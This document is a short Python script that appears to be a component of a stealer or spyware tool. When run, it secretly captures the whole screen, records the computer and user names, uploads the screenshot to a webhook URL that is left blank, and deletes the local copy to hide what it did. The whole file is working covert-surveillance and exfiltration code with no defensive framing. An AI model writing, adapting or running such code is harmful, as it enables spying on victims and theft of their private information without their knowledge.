import requests,os
from PIL import ImageGrab

webhook = ""

def grabScreenshot(web):
    LOCAL = os.getenv("LOCALAPPDATA")

    try:
        os.remove(LOCAL + '\\screen_741_852_963.png')
    except:
        pass

    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")

    payload = {
        "content": f"{pc_name} | {pc_username}",
        "username": f'PIL',
    }

    screen = ImageGrab.grab()
    screen.save(LOCAL + '\\screen_741_852_963.png')
    screen.close()

    file = LOCAL + "\\screen_741_852_963.png"

    with open(file, "rb") as openfile:
        multipart = {"file": (openfile.name, openfile, "application/octet-stream")}
        requests.post(url=f'{web}', files=multipart, data=payload)

    try:
        os.remove(LOCAL + '\\screen_741_852_963.png')
    except:
        pass

grabScreenshot(webhook)